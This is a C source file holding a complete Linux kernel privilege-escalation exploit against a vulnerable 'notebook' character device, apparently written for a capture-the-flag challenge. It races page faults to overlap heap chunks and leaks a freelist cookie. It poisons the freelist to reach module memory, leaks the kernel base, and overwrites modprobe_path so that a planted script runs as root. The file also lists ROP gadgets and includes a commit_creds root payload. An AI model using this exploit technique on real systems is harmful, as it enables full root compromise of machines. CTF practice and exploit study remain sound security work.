#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#define __USE_GNU
#include <sched.h>
#include <x86intrin.h>
#include <pthread.h>
#include <sys/sysinfo.h>
#include <errno.h>
#define uint64_t u_int64_t

#define CRED_MAGIC 0x43736564
#define CRED_MAGIC_DEAD 0x44656144

#define MAP_ADDR 0x1000000

#define TTY_STRUCT_SIZE 0x60
#define SPRAY_ALLOC_TIMES 0x100
#define NOTEBOOK_OFFSET 0xe40

int spray_fd[0x100];

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
    struct file *filp, int idx);
    int (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int (*write)(struct tty_struct * tty,
    const unsigned char *buf, int count);
    int (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int (*write_room)(struct tty_struct *tty);
    int (*chars_in_buffer)(struct tty_struct *tty);
    int (*ioctl)(struct tty_struct *tty,
    unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
    unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
    unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
    struct serial_icounter_struct *icount);
    const struct file_operations *proc_fops;
};

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;

size_t commit_creds_addr=0, prepare_kernel_cred_addr=0;

void get_root() {
    commit_creds(prepare_kernel_cred(0));
}

unsigned long user_cs;
unsigned long user_ss;
unsigned long user_sp;
unsigned long user_rflags;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

static void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  puts("[+] Win!");
  execve("/bin/sh", argv, envp);
}

typedef struct userarg{
    uint64_t idx;
    uint64_t size;
    char* buf;
}Userarg;

typedef struct node{
    uint64_t note;
    uint64_t size;
}Node;

Userarg arg;
Node note[0x10];

uint64_t ko_base = 0;
char buf[0x1000] = {0};

int gift(uint64_t fd,char* buf){
    memset(&arg, 0, sizeof(Userarg));
    memset(buf, 0xcc, 0);
    arg.buf = buf;
    return ioctl(fd,100,&arg);
}

int add(uint64_t fd,uint64_t idx,uint64_t size,char* buf){
    memset(&arg, 0, sizeof(Userarg));
    arg.idx = idx;
    arg.size = size;
    arg.buf = buf;
    return ioctl(fd,0x100,&arg);
}

int del(uint64_t fd,uint64_t idx){
    memset(&arg, 0, sizeof(Userarg));
    arg.idx = idx;
    return ioctl(fd,0x200,&arg);
}

int edit(uint64_t fd,uint64_t idx,uint64_t size,char* buf){
    memset(&arg, 0, sizeof(Userarg));
    arg.idx = idx;
    arg.size = size;
    arg.buf = buf;
    return ioctl(fd,0x300,&arg);
}

size_t find_symbols()
{
    int kallsyms_fd = open("/tmp/moduleaddr", O_RDONLY);

    if(kallsyms_fd < 0)
    {
        puts("[*]open kallsyms error!");
        exit(0);
    }
    read(kallsyms_fd,buf,24);
    char hex[20] = {0};
    read(kallsyms_fd,hex,18);
    sscanf(hex, "%llx", &ko_base);
    printf("ko_base addr: %#lx\n", ko_base);
}


void my_gift(uint64_t fd,char* buf){
    gift(fd, buf);
    for (int i = 0;i < 0x10;i++){
        note[i].note = *(uint64_t *)(buf + i * 0x10);
        note[i].size = *(uint64_t *)(buf + i*0x10 + 8);
            //printf("note[%d] addr: %#lx , size: %d\n", i, *(uint64_t *)(buf + i * 0x10), *(uint64_t *)(buf + i*0x10 + 8));
    }
}

size_t vmlinux_base = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t raw_do_tty_hangup = 0xffffffff815af980; 
size_t raw_commit_creds = 0xffffffff810a9b40; 
size_t raw_prepare_kernel_cred = 0xffffffff810a9ef0;
size_t raw_regcache_mark_dirty = 0xffffffff816405b0;
size_t raw_x64_sys_chmod = 0xffffffff81262280;
size_t raw_msleep = 0xffffffff81102360;

size_t raw_pop_rdi = 0xffffffff81007115; //pop rdi; ret;
size_t raw_pop_rdx = 0xffffffff81358842; //pop rdx; ret;
size_t raw_pop_rcx = 0xffffffff812688f3; //pop rcx; ret;

//0xffffffff8250747f : mov rdi, rax ; call rdx
//0xffffffff8147901d : mov rdi, rax ; ja 0xffffffff81479013 ; pop rbp ; ret
//size_t raw_mov_rdi_rax = 0xffffffff8195d1c2; //mov rdi, rax; cmp r8, rdx; jne 0x2cecb3; ret; 
size_t raw_mov_rdi_rax = 0xffffffff8147901d;

size_t raw_pop_rax = 0xffffffff81540d04;//pop rax; ret;
size_t raw_mov_rdi_rbx = 0xffffffff824f6a4c; //mov rdi, rbx; call rax;
size_t raw_pop_rsi = 0xffffffff8143438e; //pop rsi; ret;
size_t raw_push_rax =  0xffffffff81035b63;//push rax; ret;
size_t raw_pop_rdi_call = 0xffffffff81f0b51c; //pop rdi; call rcx;
size_t raw_xchg_eax_esp  = 0xffffffff8101d247;

//这里注意一定要使用这个gadget去维持栈平衡
//0xffffffff81063710 : push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
size_t raw_mov_cr4_rdi = 0xffffffff81063710;

size_t base_add(size_t addr){
    return addr - raw_vmlinux_base + vmlinux_base;
}

void get_flag(void){

    puts("[*] Returned to userland, setting up for fake modprobe");
    system("echo '#!/bin/sh\ncp /flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");

    system("chmod +x /tmp/dummy");


    puts("[*] Run unknown file");
    system("/tmp/dummy");


    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");
    //exit(0);
}

int main()
{
    find_symbols();
    int fd = open("/dev/notebook", O_RDWR);
    if (fd < 0)
    {
        puts("[*]open notebook error!");
        exit(0);
    }

    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));

    save_state();
    memset(fake_tty_operations, 0, sizeof(struct tty_operations));


START:
    for (int i = 0; i < 0x10; i++)
    {
        del(fd,i);
    }

    //偶数id 用来申请0x60的chunk
    for (int i = 0; i < 0x10; i+=2)
    {
        edit(fd, i, 0x60, "will");   
    }    
    
    pid_t pid = fork();
    if (!pid)
    {
        sleep(1);
        for (int i = 0; i < 0x10; i+=2)
        {
            edit(fd, i, 0, 0);  //triggle sleep from page fault
            sleep(0.1);
        }
        return 0;
    }
    else
    {
        for (int i = 0;i < 0x10;i+=2){
            gift(fd, buf);
            while (*(uint64_t *)(buf + i * 0x10 + 8))
            {
                gift(fd, buf);
            }
            //将被释放的偶数id的chunk 用奇数id申请回来, 有几率造成chunk overlap
            edit(fd,i+1,0x60,"temp");  
            edit(fd,i,0x60,"temp");
        }
        
        //存储所有的note
        gift(fd, buf);
        for (int i = 0;i < 0x10;i++){
            note[i].note = *(uint64_t *)(buf + i * 0x10);
            note[i].size = *(uint64_t *)(buf + i*0x10 + 8);
            printf("note[%d] addr: %#lx , size: %d\n", i, *(uint64_t *)(buf + i * 0x10), *(uint64_t *)(buf + i*0x10 + 8));
        }
    }

    //找到两个chunk overlap的id
    int x = -1,y = -1;
    for (int i = 0;i < 0x10;i++){
        for (int j = i + 1;j < 0x10;j++){
            if (note[i].note == note[j].note && note[i].note){
                x = i;
                y = j;
                break;
            }
        }
        if (x != -1 && y != -1)
            break;
    }
    //如果没找到,再来一遍
    if (x == -1 || y == -1)
        goto START;
    else{
        printf("x idx : %d\n",x);
        printf("y idx : %d\n",y);
    }

    for (int i = 0; i < 0x10; i++)
    {
        if(i != x && i != y){
            del(fd, i);
        }
    }  

    
    int z = (y + 1)%0x10;
    while(z==x || z== y ) z=(z+1)%0x10;
    int p = (z + 1)%0x10;
    while(p==x || p== y || p ==z) p=(p+1)%0x10;

    //edit(fd,p,0x60,"tmp");
    edit(fd,z,0x60,"tmp");

    del(fd,z); 
    //此时x和y指向同一块地址空间,释放y,可以用x 去write这块空间
    // freelist-> y -> z -> ....
    del(fd,y);
    edit(fd, y, 0x60, "temp");
    edit(fd, z, 0x60, "temp");

    gift(fd,buf);
    printf("1: %p\n", *(size_t*)(buf + y*0x10));
    printf("1: %p\n", *(size_t*)(buf + z*0x10));
    printf("1: %p\n", note[x].note);
    printf("1: %p\n", note[z].note);
    
    
    char xbuf[0x60] = {0};
    read(fd, xbuf, x);
    uint64_t cc = *(uint64_t *)xbuf;
    uint64_t cookie = cc ^ *(size_t*)(buf + y*0x10) ^ *(size_t*)(buf + z*0x10);
    printf("heap cookie: %p\n", cookie);

    // what we want is :  freelist -> y -> &notebook-0x10 (ko_base) -> 0
    // freelist -> y -> notebook -0x10 -> 0
    // freelist -> (y ^ (notebook-0x10) ^ cookie )  -> ( (notebook-0x10) ^ cookie ^0)
    // by debugging , we know that ko_base + 0x2500 is the address of notebook
    // notebook-0x10  is the area of "name" in bss : notebook-0x10 == name + 0xf0

    // set name + 0xf0 = (notebook-0x10) ^ cookie
    char name_buf[0x100]= {0};
    *(size_t *)(name_buf+0xf0) = cookie ^ (ko_base + 0x2500 - 0x10);
    //edit(fd,p,0x200,name_buf);

    del(fd,y);
    // write x : (y ^ (notebook-0x10) ^ cookie ) 
    memset(xbuf,0,0x60);
    *(size_t *)xbuf =  note[x].note ^ cookie ^ (ko_base + 0x2500 - 0x10);
    write(fd, xbuf, x);

    // now alloc a chunk will get the address --- ko_base + 0x2500 - 0x10
    int id = 0; 
    for(int i=0; i<0x10; i++){
        if(i==x) continue;
        add(fd,i,0x60,name_buf);
        gift(fd,buf); 
        size_t tmp_chunk = *(size_t*)(buf + i*0x10);
        if(tmp_chunk == note[x].note){
            printf("[+] Success fengshui!\n");
            id = i;
            break;
        }
        if(i == 0xf){
            goto START;
        }
    }

    char tmp[0x10]= {0};
    read(0,tmp,0x10);

    id = id+1;
    if(id==x) id++;
    add(fd, id, 0x60,name_buf);


    size_t BUF[0x60] = {0};
    BUF[2] = ko_base + 0x168;   //notebook[0] : copy_from_user的相对偏移
    BUF[3] = 0x4;
    BUF[4] = ko_base + 0x2500;  //notebook[1]
    BUF[5] = 0x60;
    write(fd,BUF,id);

    read(0,tmp,0x10);

    memset(xbuf,0,0x60);
    read(fd, xbuf, 0);

    //copy from user的相对跳转
    vmlinux_base = ((*(uint32_t*)xbuf + ko_base + 0x16C) | 0xFFFFFFFF00000000) - 0x476C30;
    printf("kernel base is %p\n", vmlinux_base);

    size_t modprobe_path = vmlinux_base + 0x125D2E0;

    BUF[0] = modprobe_path;
    BUF[1] = 0x10;
    write(fd,BUF,1);

    memset(xbuf, 0, 0x10);
    strcpy(xbuf,"/tmp/x");
    write(fd,xbuf,0);

    get_flag();
    
    close(fd);
    return 0;
}
